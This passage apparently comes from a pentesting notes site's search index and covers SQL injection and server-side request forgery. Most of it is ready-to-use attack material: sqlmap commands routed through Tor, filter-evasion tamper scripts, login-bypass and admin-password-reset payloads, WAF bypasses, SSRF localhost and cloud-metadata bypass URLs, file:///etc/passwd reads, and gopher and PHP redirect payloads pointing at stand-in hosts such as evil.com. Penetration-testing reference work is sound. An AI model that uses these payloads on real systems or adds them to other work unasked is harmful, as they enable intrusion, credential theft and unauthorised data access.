-u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3\n\n--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers\n--crawl = how deep you want to crawl a site\n--forms = Parse and test forms\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#using-tor-with-sqlmap","title":"Using TOR with SQLmap","text":"<pre><code>sqlmap -u \"http://www.target.com\" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#using-a-proxy-with-sqlmap","title":"Using a proxy with SQLmap","text":"<pre><code>sqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\"\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#using-chrome-cookie-and-a-proxy","title":"Using Chrome cookie and a Proxy","text":"<pre><code>sqlmap -u \"https://test.com/index.php?id=99\" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy \"http://127.0.0.1:8080\"  -f  --time-sec 15 --level 3\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#using-suffix-to-tamper-the-injection","title":"Using suffix to tamper the injection","text":"<pre><code>python sqlmap.py -u \"http://example.com/?id=1\"  -p id --suffix=\"-- \"\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#general-tamper-option-and-tampers-list","title":"General tamper option and tamper's list","text":"<pre><code>tamper=name_of_the_tamper\n</code></pre> Tamper Description 0x2char.py Replaces each (MySQL) 0x encoded string with equivalent CONCAT(CHAR(),\u2026) counterpart apostrophemask.py Replaces apostrophe character with its UTF-8 full width counterpart apostrophenullencode.py Replaces apostrophe character with its illegal double unicode counterpart appendnullbyte.py Appends encoded NULL byte character at the end of payload base64encode.py Base64 all characters in a given payload between.py Replaces greater than operator ('&gt;') with 'NOT BETWEEN 0 AND #' bluecoat.py Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator chardoubleencode.py Double url-encodes all characters in a given payload (not processing already encoded) charencode.py URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54) charunicodeencode.py Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054) charunicodeescape.py Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054) commalesslimit.py Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' commalessmid.py Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' commentbeforeparentheses.py Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/() concat2concatws.py Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' charencode.py Url-encodes all characters in a given payload (not processing already encoded) charunicodeencode.py Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded) equaltolike.py Replaces all occurances of operator equal ('=') with operator 'LIKE' escapequotes.py Slash escape quotes (' and \") greatest.py Replaces greater than operator ('&gt;') with 'GREATEST' counterpart halfversionedmorekeywords.py Adds versioned MySQL comment before each keyword htmlencode.py HTML encode (using code points) all non-alphanumeric characters (e.g. \u2018 -&gt; ') ifnull2casewhenisnull.py Replaces instances like \u2018IFNULL(A, B)\u2019 with \u2018CASE WHEN ISNULL(A) THEN (B) ELSE (A) END\u2019 counterpart ifnull2ifisnull.py Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' informationschemacomment.py Add an inline comment (/**/) to the end of all occurrences of (MySQL) \u201cinformation_schema\u201d identifier least.py Replaces greater than operator (\u2018&gt;\u2019) with \u2018LEAST\u2019 counterpart lowercase.py Replaces each keyword character with lower case value (e.g. SELECT -&gt; select) modsecurityversioned.py Embraces complete query with versioned comment modsecurityzeroversioned.py Embraces complete query with zero-versioned comment multiplespaces.py Adds multiple spaces around SQL keywords nonrecursivereplacement.py Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\"SELECT\", \"\")) filters overlongutf8.py Converts all characters in a given payload (not processing already encoded) overlongutf8more.py Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) percentage.py Adds a percentage sign ('%') infront of each character plus2concat.py Replaces plus operator (\u2018+\u2019) with (MsSQL) function CONCAT() counterpart plus2fnconcat.py Replaces plus operator (\u2018+\u2019) with (MsSQL) ODBC function {fn CONCAT()} counterpart randomcase.py Replaces each keyword character with random case value randomcomments.py Add random comments to SQL keywords securesphere.py Appends special crafted string sp_password.py Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs space2comment.py Replaces space character (' ') with comments space2dash.py Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n') space2hash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2morehash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2mssqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mssqlhash.py Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n') space2mysqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mysqldash.py Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n') space2plus.py Replaces space character (' ') with plus ('+') space2randomblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters symboliclogical.py Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and unionalltounion.py Replaces UNION ALL SELECT with UNION SELECT unmagicquotes.py Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) uppercase.py Replaces each keyword character with upper case value 'INSERT' varnish.py Append a HTTP header 'X-originating-IP' versionedkeywords.py Encloses each non-function keyword with versioned MySQL comment versionedmorekeywords.py Encloses each keyword with versioned MySQL comment xforwardedfor.py Append a fake HTTP header 'X-Forwarded-For'"},{"location":"Pentesting/Web%20Application/sql-injection/#authentication-bypass-flow","title":"Authentication bypass flow","text":"User name Password SQL Query tom tom <p>SELECT * FROM usersWHERE name='tom'and password='tom'</p> tom ' or '1'='1 <p>SELECT * FROM usersWHERE name='tom'and password='' or '1'='1'</p> tom ' or 1='1 <p>SELECT * FROM usersWHERE name='tom'and password='' or 1='1'</p> tom 1' or 1=1 -- - <p>SELECT * FROM usersWHERE name='tom'and password='' or 1=1-- -'</p> ' or '1'='1 ' or '1'='1 <p>SELECT * FROM usersWHERE name='' or '1'='1'and password='' or '1'='1'</p> ' or ' 1=1 ' or ' 1=1 <p>SELECT * FROM usersWHERE name='' or ' 1=1'and password='' or ' 1=1'</p> 1' or 1=1 -- - blah <p>SELECT * FROM usersWHERE name='1' or 1=1 -- -'and password='blah'</p>"},{"location":"Pentesting/Web%20Application/sql-injection/#authentication-bypass","title":"Authentication bypass","text":"<pre><code>'-'\n' '\n'&amp;'\n'^'\n'*'\n' or 1=1 limit 1 -- -+\n'=\"or'\n' or ''-'\n' or '' '\n' or ''&amp;'\n' or ''^'\n' or ''*'\n'-||0'\n\"-||0\"\n\"-\"\n\" \"\n\"&amp;\"\n\"^\"\n\"*\"\n'--'\n\"--\"\n'--' / \"--\"\n\" or \"\"-\"\n\" or \"\" \"\n\" or \"\"&amp;\"\n\" or \"\"^\"\n\" or \"\"*\"\nor true--\n\" or true--\n' or true--\n\") or true--\n') or true--\n' or 'x'='x\n') or ('x')=('x\n')) or (('x'))=(('x\n\" or \"x\"=\"x\n\") or (\"x\")=(\"x\n\")) or ((\"x\"))=((\"x\nor 2 like 2\nor 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\nadmin' --\nadmin' -- -\nadmin' #\nadmin'/*\nadmin' or '2' LIKE '1\nadmin' or 2 LIKE 2--\nadmin' or 2 LIKE 2#\nadmin') or 2 LIKE 2#\nadmin') or 2 LIKE 2--\nadmin') or ('2' LIKE '2\nadmin') or ('2' LIKE '2'#\nadmin') or ('2' LIKE '2'/*\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin' or '1'='1'#\nadmin' or '1'='1'/*\nadmin'or 1=1 or ''='\nadmin' or 1=1\nadmin' or 1=1--\nadmin' or 1=1#\nadmin' or 1=1/*\nadmin') or ('1'='1\nadmin') or ('1'='1'--\nadmin') or ('1'='1'#\nadmin') or ('1'='1'/*\nadmin') or '1'='1\nadmin') or '1'='1'--\nadmin') or '1'='1'#\nadmin') or '1'='1'/*\n1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\nadmin\" --\nadmin';-- azer \nadmin\" #\nadmin\"/*\nadmin\" or \"1\"=\"1\nadmin\" or \"1\"=\"1\"--\nadmin\" or \"1\"=\"1\"#\nadmin\" or \"1\"=\"1\"/*\nadmin\"or 1=1 or \"\"=\"\nadmin\" or 1=1\nadmin\" or 1=1--\nadmin\" or 1=1#\nadmin\" or 1=1/*\nadmin\") or (\"1\"=\"1\nadmin\") or (\"1\"=\"1\"--\nadmin\") or (\"1\"=\"1\"#\nadmin\") or (\"1\"=\"1\"/*\nadmin\") or \"1\"=\"1\nadmin\") or \"1\"=\"1\"--\nadmin\") or \"1\"=\"1\"#\nadmin\") or \"1\"=\"1\"/*\n1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#authentication-bypass-raw-md5-sha1","title":"Authentication Bypass (Raw MD5 SHA1)","text":"<p>When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.</p> <pre><code>\"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\"\n</code></pre> <p>Allowing an attacker to craft a string with a <code>true</code> statement such as <code>' or 'SOMETHING</code></p> <pre><code>md5(\"ffifdyop\", true) = 'or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\ufffd\nsha1(\"3fDf \", true) = Q\ufffdu'='\ufffd@\ufffd[\ufffdt\ufffd- o\ufffd\ufffd_-!\n</code></pre> <p>Challenge demo available at http://web.jarvisoj.com:32772</p>"},{"location":"Pentesting/Web%20Application/sql-injection/#polyglot-injection-multicontext","title":"Polyglot injection (multicontext)","text":"<pre><code>SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/\n\n/* MySQL only */\nIF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#routed-injection","title":"Routed injection","text":"<pre><code>admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#insert-statement-on-duplicate-key-update","title":"Insert Statement - ON DUPLICATE KEY UPDATE","text":"<p>ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:</p> <pre><code>Inject using payload:\n  attacker_dummy@example.com\", \"bcrypt_hash_of_qwerty\"), (\"admin@example.com\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" --\n\nThe query would look like this:\nINSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"bcrypt_hash_of_qwerty\"), (\"admin@example.com\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" -- \", \"bcrypt_hash_of_your_password_input\");\n\nThis query will insert a row for the user \u201cattacker_dummy@example.com\u201d. It will also insert a row for the user \u201cadmin@example.com\u201d.\nBecause this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to \"bcrypt_hash_of_qwerty\".\n\nAfter this, we can simply authenticate with \u201cadmin@example.com\u201d and the password \u201cqwerty\u201d!\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#waf-bypass","title":"WAF Bypass","text":"<p>No Space (%20) - bypass using whitespace alternatives</p> <pre><code>?id=1%09and%091=1%09--\n?id=1%0Dand%0D1=1%0D--\n?id=1%0Cand%0C1=1%0C--\n?id=1%0Band%0B1=1%0B--\n?id=1%0Aand%0A1=1%0A--\n?id=1%A0and%A01=1%A0--\n</code></pre> <p>No Whitespace - bypass using comments</p> <pre><code>?id=1/*comment*/and/**/1=1/**/--\n</code></pre> <p>No Whitespace - bypass using parenthesis</p> <pre><code>?id=(1)and(1)=(1)--\n</code></pre> <p>No Comma - bypass using OFFSET, FROM and JOIN</p> <pre><code>LIMIT 0,1         -&gt; LIMIT 1 OFFSET 0\nSUBSTR('SQL',1,1) -&gt; SUBSTR('SQL' FROM 1 FOR 1).\nSELECT 1,2,3,4    -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d\n</code></pre> <p>No Equal - bypass using LIKE/NOT IN/IN/BETWEEN</p> <pre><code>?id=1 and substring(version(),1,1)like(5)\n?id=1 and substring(version(),1,1)not in(4,3)\n?id=1 and substring(version(),1,1)in(4,3)\n?id=1 and substring(version(),1,1) between 3 and 4\n</code></pre> <p>Blacklist using keywords - bypass using uppercase/lowercase</p> <pre><code>?id=1 AND 1=1#\n?id=1 AnD 1=1#\n?id=1 aNd 1=1#\n</code></pre> <p>Blacklist using keywords case insensitive - bypass using an equivalent operator</p> <pre><code>AND   -&gt; &amp;&amp;\nOR    -&gt; ||\n=     -&gt; LIKE,REGEXP, BETWEEN, not &lt; and not &gt;\n&gt; X   -&gt; not between 0 and X\nWHERE -&gt; HAVING\n</code></pre> <p>Information_schema.tables Alternative</p> <pre><code>select * from mysql.innodb_table_stats;\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |\n| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |\n...\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n\nmysql&gt; show tables in dvwa;\n+----------------+\n| Tables_in_dvwa |\n+----------------+\n| guestbook      |\n| users          |\n+----------------+\n</code></pre> <p>Version Alternative</p> <pre><code>mysql&gt; select @@innodb_version;\n+------------------+\n| @@innodb_version |\n+------------------+\n| 5.6.31           |\n+------------------+\n\nmysql&gt; select @@version;\n+-------------------------+\n| @@version               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\n\nmysql&gt; mysql&gt; select version();\n+-------------------------+\n| version()               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#references","title":"References","text":"<ul> <li> <p>https://portswigger.net/web-security/sql-injection </p> </li> <li> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/ </p> </li> <li> <p>Detect SQLi Damn Small SQLi Scanner (DSSS) Manual SQL Injection Discovery Tips NetSPI SQL Injection Wiki </p> </li> <li>MySQL: PentestMonkey's mySQL injection cheat sheet Reiners mySQL injection Filter Evasion Cheatsheet Alternative for Information_Schema.Tables in MySQL The SQL Injection Knowledge base </li> <li>MSSQL: EvilSQL's Error/Union/Blind MSSQL Cheatsheet PentestMonkey's MSSQL SQLi injection Cheat Sheet </li> <li>ORACLE: PentestMonkey's Oracle SQLi Cheatsheet </li> <li>POSTGRESQL: PentestMonkey's Postgres SQLi Cheatsheet </li> <li>Others SQLi Cheatsheet - NetSparker Access SQLi Cheatsheet PentestMonkey's Ingres SQL Injection Cheat Sheet Pentestmonkey's DB2 SQL Injection Cheat Sheet Pentestmonkey's Informix SQL Injection Cheat Sheet SQLite3 Injection Cheat sheet Ruby on Rails (Active Record) SQL Injection Guide SQLi in INSERT worse than SELECT Manual SQL Injection Tips </li> <li>Second Order: Exploiting Second Order SQLi Flaws by using Burp &amp; Custom Sqlmap Tamper </li> <li>Sqlmap: #SQLmap protip @zh4ck </li> </ul>"},{"location":"Pentesting/Web%20Application/sql-injection/#sqlmap-tamper-suggester","title":"Sqlmap Tamper Suggester","text":"<ul> <li>https://github.com/m4ll0k/Atlas</li> </ul>"},{"location":"Pentesting/Web%20Application/ssrf/","title":"Server-side request forgery (SSRF)","text":""},{"location":"Pentesting/Web%20Application/ssrf/#server-side-request-forgery-ssrf","title":"Server-side request forgery (SSRF)","text":""},{"location":"Pentesting/Web%20Application/ssrf/#concept","title":"Concept","text":"<p>Server-Side Request Forgery (SSRF) vulnerabilities let an attacker send crafted requests from the back-end server of a vulnerable web application. Criminals usually use SSRF attacks to target internal systems that are behind firewalls and are not accessible from the external network. An attacker may also leverage SSRF to access services available through the loopback interface (127.0.0.1) of the exploited server.</p>"},{"location":"Pentesting/Web%20Application/ssrf/#types-of-ssrf","title":"Types of SSRF","text":"<p>This type of SSRF displays results in the application's front-end response to the attacker, so after the server fetches the URL asked by the attacker for him, it will send the response back to the attacker.</p> <p>Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.</p>"},{"location":"Pentesting/Web%20Application/ssrf/#basic-ssrf","title":"Basic SSRF","text":""},{"location":"Pentesting/Web%20Application/ssrf/#blind-ssrf","title":"Blind SSRF","text":""},{"location":"Pentesting/Web%20Application/ssrf/#ways-to-exploit","title":"Ways to exploit","text":"<ul> <li>https://medium.com/@vickieli/exploiting-ssrfs-b3a29dd7437</li> </ul>"},{"location":"Pentesting/Web%20Application/ssrf/#by-using-localhost","title":"By using localhost","text":"<pre><code>http://127.0.0.1:80\nhttp://127.0.0.1:443\nhttp://127.0.0.1:22\n[or]\nhttp://0.0.0.0:80\nhttp://0.0.0.0:443\nhttp://0.0.0.0:22\n[or]\nhttp://localhost:80\nhttp://localhost:443\nhttp://localhost:22\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-localhost-with","title":"Bypass localhost with [::]","text":"<pre><code>http://[::]:80/\nhttp://[::]:25/ SMTP\nhttp://[::]:22/ SSH\nhttp://[::]:3128/ Squid\nhttp://0000::1:80/\nhttp://0000::1:25/ SMTP\nhttp://0000::1:22/ SSH\nhttp://0000::1:3128/ Squid\nhttp://127.1/\nhttp://0000::1:80/\nhttp://2130706433/\nhttp://whitelisted@127.0.0.1\nhttp://0x7f000001/\nhttp://017700000001\nhttp://0177.00.00.01\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-localhost-with-a-domain-redirecting-to-localhost","title":"Bypass localhost with a domain redirecting to localhost","text":"<pre><code>https://xyz.com ---&gt;&gt; 127.0.0.1\nhttp://mail.ebc.apple.com redirect to 127.0.0.6 == localhost\nhttp://bugbounty.dod.network redirect to 127.0.0.2 == localhost\n\nOther way \nuse https://nip.io/\nNIP.IO maps &lt;anything&gt;.&lt;IP Address&gt;.nip.io to the corresponding &lt;IP Address&gt;, \neven 127.0.0.1.nip.io maps to 127.0.0.1\nLike\nhttp://customer1.app.localhost.my.company.127.0.0.1.nip.io will point to 127.0.0.1        \n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-using-a-decimal-ip-location","title":"Bypass using a decimal IP location","text":"<pre><code>http://2130706433/ = http://127.0.0.1\nhttp://3232235521/ = http://192.168.0.1\nhttp://3232235777/ = http://192.168.1.1\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-localhost-with-cidr","title":"Bypass localhost with CIDR","text":"<pre><code>It's a /8\n\nhttp://127.127.127.127\nhttp://127.0.1.3\nhttp://127.0.0.0\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-using-ipv6ipv4-address-embedding","title":"Bypass using IPv6/IPv4 Address Embedding","text":"<pre><code>http://[0:0:0:0:0:ffff:127.0.0.1]\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-using-malformed-urls","title":"Bypass using malformed urls","text":"<pre><code>localhost:+11211aaa\nlocalhost:00011211aaaa\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-using-rare-address","title":"Bypass using rare address","text":"<pre><code>You can short-hand IP addresses by dropping the zeros\nhttp://0/\nhttp://127.1\nhttp://127.0.1\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-using-bash-variables","title":"Bypass using bash variables","text":"<pre><code>cURL only\n\ncurl -v \"http://evil$google.com\"\n$google = \"\"\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-using-tricks-combination","title":"Bypass using tricks combination","text":"<pre><code>http://1.1.1.1 &amp;@2.2.2.2# @3.3.3.3/\nurllib2 : 1.1.1.1\nrequests + browsers : 2.2.2.2\nurllib : 3.3.3.3\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-using-enclosed-alphanumerics","title":"Bypass using enclosed alphanumerics","text":"<pre><code>http://\u24d4\u24e7\u24d0\u24dc\u24df\u24db\u24d4.\u24d2\u24de\u24dc = example.com\n\nList:\n\u2460 \u2461 \u2462 \u2463 \u2464 \u2465 \u2466 \u2467 \u2468 \u2469 \u246a \u246b \u246c \u246d \u246e \u246f \u2470 \u2471 \u2472 \u2473 \u2474 \u2475 \u2476 \u2477 \u2478 \u2479 \u247a \u247b \u247c \u247d \u247e \u247f \u2480 \u2481 \u2482 \u2483 \u2484 \u2485 \u2486 \u2487 \u2488 \u2489 \u248a \u248b \u248c \u248d \u248e \u248f \u2490 \u2491 \u2492 \u2493 \u2494 \u2495 \u2496 \u2497 \u2498 \u2499 \u249a \u249b \u249c \u249d \u249e \u249f \u24a0 \u24a1 \u24a2 \u24a3 \u24a4 \u24a5 \u24a6 \u24a7 \u24a8 \u24a9 \u24aa \u24ab \u24ac \u24ad \u24ae \u24af \u24b0 \u24b1 \u24b2 \u24b3 \u24b4 \u24b5 \u24b6 \u24b7 \u24b8 \u24b9 \u24ba \u24bb \u24bc \u24bd \u24be \u24bf \u24c0 \u24c1 \u24c2 \u24c3 \u24c4 \u24c5 \u24c6 \u24c7 \u24c8 \u24c9 \u24ca \u24cb \u24cc \u24cd \u24ce \u24cf \u24d0 \u24d1 \u24d2 \u24d3 \u24d4 \u24d5 \u24d6 \u24d7 \u24d8 \u24d9 \u24da \u24db \u24dc \u24dd \u24de \u24df \u24e0 \u24e1 \u24e2 \u24e3 \u24e4 \u24e5 \u24e6 \u24e7 \u24e8 \u24e9 \u24ea \u24eb \u24ec \u24ed \u24ee \u24ef \u24f0 \u24f1 \u24f2 \u24f3 \u24f4 \u24f5 \u24f6 \u24f7 \u24f8 \u24f9 \u24fa \u24fb \u24fc \u24fd \u24fe \u24ff\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-filter_var-php-function","title":"Bypass filter_var() php function","text":"<pre><code>0://evil.com:80;http://google.com:80/\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#bypass-against-a-weak-parser","title":"Bypass against a weak parser","text":"<pre><code>http://127.1.1.1:80\\@127.2.2.2:80/\nhttp://127.1.1.1:80\\@@127.2.2.2:80/\nhttp://127.1.1.1:80:\\@@127.2.2.2:80/\nhttp://127.1.1.1:80#\\@127.2.2.2:80/\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#advanced-exploit-using-a-redirection","title":"Advanced exploit using a redirection","text":"<pre><code>Create a subdomain pointing to 192.168.0.1 with DNS A record.\nLaunch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP\nvulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#advanced-exploit-using-typeurl-while-uploading-a-fileimage","title":"Advanced exploit using (type=url) while uploading a file/image","text":"<pre><code>Change \"type=file\" to \"type=url\"\nPaste URL in text field and hit enter\nUsing this vulnerability users can upload images from any image URL = trigger an SSRF\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#exploitation-via-url-scheme","title":"Exploitation via URL Scheme","text":""},{"location":"Pentesting/Web%20Application/ssrf/#file","title":"File","text":"<p>Allows an attacker to fetch the content of a file on the server</p> <pre><code>file://path/to/file\nfile:///etc/passwd\nfile://\\/\\/etc/passwd\nssrf.php?url=file:///etc/passwd\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#http","title":"HTTP","text":"<p>Allows an attacker to fetch any content from the web, it can also be used to scan ports.</p> <pre><code>ssrf.php?url=http://127.0.0.1:22\nssrf.php?url=http://127.0.0.1:80\nssrf.php?url=http://127.0.0.1:443\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#dict","title":"Dict","text":"<p>The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:</p> <pre><code>dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;\nssrf.php?url=dict://attacker:11111/\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#sftp","title":"SFTP","text":"<p>A network protocol used for secure file transfer over secure shell</p> <pre><code>ssrf.php?url=sftp://evil.com:11111/\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#tftp","title":"TFTP","text":"<p>Trivial File Transfer Protocol, works over UDP</p> <pre><code>ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#ldap","title":"LDAP","text":"<p>Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.</p> <pre><code>ssrf.php?url=ldap://localhost:11211/%0astats%0aquit\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#gopher","title":"Gopher","text":"<p>It is a distributed document delivery service. It allows users to explore, search and retrieve information residing on different locations in a seamless fashion.</p> <pre><code>ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a\n\nwill make a request like\nHELO localhost\nMAIL FROM:&lt;hacker@site.com&gt;\nRCPT TO:&lt;victim@site.com&gt;\nDATA\nFrom: [Hacker] &lt;hacker@site.com&gt;\nTo: &lt;victime@site.com&gt;\nDate: Tue, 15 Sep 2017 17:20:26 -0400\nSubject: Ah Ah AH\n\nYou didn't say the magic word !\n\n\n.\nQUIT\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#gopher-http","title":"Gopher HTTP","text":"<pre><code>gopher://&lt;proxyserver&gt;:8080/_GET http://&lt;attacker:80&gt;/x HTTP/1.1%0A%0A\ngopher://&lt;proxyserver&gt;:8080/_POST%20http://&lt;attacker&gt;:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#gopher-smtp-back-connect-to-1337","title":"Gopher SMTP - Back connect to 1337","text":"<pre><code>Content of evil.com/redirect.php:\n&lt;?php\nheader(\"Location: gopher://hack3r.site:1337/_SSRF%0ATest!\");\n?&gt;\n\nNow query it.\nhttps://example.com/?q=http://evil.com/redirect.php.\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#gopher-smtp-send-a-mail","title":"Gopher SMTP - send a mail","text":"<pre><code>Content of evil.com/redirect.php:\n&lt;?php\n        $commands = array(\n                'HELO victim.com',\n                'MAIL FROM: &lt;admin@victim.com&gt;',\n                'RCPT To: &lt;sxcurity@oou.us&gt;',\n                'DATA',\n                'Subject: @sxcurity!',\n                'Corben was here, woot woot!',\n                '.'\n        );\n\n        $payload = implode('%0A', $commands);\n\n        header('Location: gopher://0:25/_'.$payload);\n?&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#netdoc","title":"Netdoc","text":"<p>Wrapper for Java when your payloads struggle with \"\\n\" and \"\\r\" characters.</p> <pre><code>ssrf.php?url=gopher://127.0.0.1:4242/DATA\n</code></pre>"},{"location":"Pentesting/Web%20Application/ssrf/#ssrf-to-xss","title":"SSRF to XSS","text":"<p>Payload: http://brutelogic.com.br/poc.svg</p> <p>https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg</p>"},{"location":"Pentesting/Web%20Application/ssrf/#ssrf-url-for-cloud-instances","title":"SSRF URL for Cloud Instances","text":""},{"location":"Pentesting/Web%20Application/ssrf/#aws","title":"AWS","text":"<ul> <li>DNS record  </li> </ul> <p>http://instance-data http://169.254.169.254 http://metadata.nicob.net/ http://169.254.169.254.xip.io/ http://1ynrnhl.xip.io/ http://www.owasp.org.1ynrnhl.xip.io/ </p> <ul> <li>HTTP redirect  </li> </ul> <p>Static:http://nicob.net/redir6a Dynamic:http://nicob.net/redir-http-169.254.169.254:80- </p> <ul> <li>Alternate IP encoding  </li> </ul> <p>http://425.510.425.510/ Dotted decimal with overflow http://2852039166/ Dotless decimal http://7147006462/ Dotless 